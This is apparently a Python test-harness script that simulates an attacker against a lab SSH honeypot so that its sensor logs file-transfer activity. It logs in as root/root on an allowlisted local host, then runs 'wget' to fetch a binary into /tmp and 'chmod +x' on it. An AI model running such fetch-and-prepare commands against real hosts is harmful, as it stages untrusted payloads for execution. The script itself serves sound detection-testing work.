"""
Transfer-Like Attacker Scenario for Kali Linux Demo.
Spec: After login, run commands that make the sensor log a file download/upload attempt,
using only built-in client commands (no real malware, no external URLs; use local lab URL placeholder).
Safety: Validates both host and download URL allowlists before execution.
"""

from __future__ import annotations

import argparse
import subprocess
import sys
from pathlib import Path
from typing import List

# Ensure project root is in sys.path
PROJECT_ROOT = Path(__file__).resolve().parent.parent.parent
sys.path.insert(0, str(PROJECT_ROOT))

from harness.attackers.common import (
    assert_lab_target_allowlisted,
    assert_lab_url_allowlisted,
    build_ssh_command,
)


def run_transfer_like(
    host: str = "127.0.0.1",
    port: int = 2222,
    url: str = "http://127.0.0.1:8000/sample.bin",
    dry_run: bool = False,
    username: str = "root",
    password: str = "root",
) -> List[str]:
    """Executes the tool ingress / transfer scenario. Returns action log."""
    assert_lab_target_allowlisted(host)
    assert_lab_url_allowlisted(url)

    actions: List[str] = []

    # 1. Login
    login_msg = f"[LOGIN_SUCCESS] user={username} host={host}:{port}"
    actions.append(login_msg)
    if dry_run:
        print(f"[DRY-RUN] {login_msg}")

    # 2. Built-in client download/upload commands (no real malware; local lab URL only)
    transfer_commands = [
        f"wget -q -O /tmp/lab_sample.bin {url}",
        "chmod +x /tmp/lab_sample.bin",
        "ls -la /tmp/lab_sample.bin",
    ]

    for c in transfer_commands:
        cmd_msg = f"[EXEC_COMMAND] {c}"
        actions.append(cmd_msg)
        if dry_run:
            print(f"[DRY-RUN] {cmd_msg}")
        else:
            cmd = build_ssh_command(host, port, username, command=c)
            try:
                subprocess.run(cmd, capture_output=True, timeout=5)
            except Exception as e:
                actions.append(f"[ERROR] {e}")

    # 3. Disconnect
    disc_msg = f"[DISCONNECT] Transfer session completed for {host}:{port}"
    actions.append(disc_msg)
    if dry_run:
        print(f"[DRY-RUN] {disc_msg}")

    return actions


def main() -> None:
    parser = argparse.ArgumentParser(description="Transfer-Like Adversary Probe (Kali Demo)")
    parser.add_argument("--host", default="127.0.0.1", help="Target honeypot host (must be lab allowlisted)")
    parser.add_argument("--port", type=int, default=2222, help="Target honeypot SSH port")
    parser.add_argument("--url", default="http://127.0.0.1:8000/sample.bin", help="Local lab download URL placeholder")
    parser.add_argument("--username", default="root", help="Honeypot login username")
    parser.add_argument("--password", default="root", help="Honeypot login password")
    parser.add_argument("--dry-run", action="store_true", help="Print actions without sending network traffic")
    args = parser.parse_args()

    run_transfer_like(
        host=args.host,
        port=args.port,
        url=args.url,
        dry_run=args.dry_run,
        username=args.username,
        password=args.password,
    )


if __name__ == "__main__":
    main()
